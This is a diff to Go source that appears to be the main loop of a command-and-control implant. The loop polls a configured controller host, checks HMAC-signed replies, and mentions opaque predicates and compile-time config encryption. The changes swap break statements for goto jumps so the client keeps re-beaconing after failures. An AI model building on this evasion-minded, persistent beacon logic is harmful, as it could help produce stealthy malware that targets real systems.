@@ -70,14 +70,9 @@ func X1A9T(x int) bool {
 func main() {
 	/*
 		Todo:
-		The config should be encrypted at compile time [x]
-		Values gotten from it should be decrypted upon use
-		Then garbage collected and repeat the cycle every use
 
-		makefile needs adjusting to determine if listeners use compression/auth
-		and the paths they use, otherwise can get out of sync
 	*/
-
+startpoint:
 	seed := "supersecretseedvalue"
 	secureFunc := shared.NewSecureFunction(seed)
 	initCouner := secureFunc.DeriveCount()
@@ -101,7 +96,7 @@ func main() {
 			maxRetries := 3
 
 			for {
-				// opaque predicate to branch path again
+				// opaque predicate to branch path again?
 				baseUrl := ""
 				baseUrl = conf.Method + "://" + conf.Host + ":" + conf.Port + conf.GetPath
 				postUrl := ""
@@ -147,10 +142,11 @@ func main() {
 					// Check the response status
 					if resp.StatusCode != http.StatusOK {
 						// non-OK http status
-						break
+						goto startpoint
 					}
 
 					// Read the response body
+					// Should probably change this to retry the send attempt?
 					body, err := io.ReadAll(resp.Body)
 					if err != nil {
 						// reading response body failed
@@ -194,7 +190,8 @@ func main() {
 							return
 						}
 						fmt.Println(initCouner)
-						break
+						//break
+						goto startpoint
 
 					} else {
 						fmt.Println("HMAC is invalid or message was tampered with.")
@@ -229,7 +226,7 @@ func main() {
 					// Check the response status
 					if resp.StatusCode != http.StatusOK {
 						// non-OK http status
-						break
+						goto startpoint
 					}
 
 					// Read the response body
@@ -278,7 +275,8 @@ func main() {
 							fmt.Println(err)
 						}
 						fmt.Println(initCouner)
-						break
+						//break
+						goto startpoint
 
 					case false:
 						fmt.Println("HMAC is invalid or message was tampered with.")
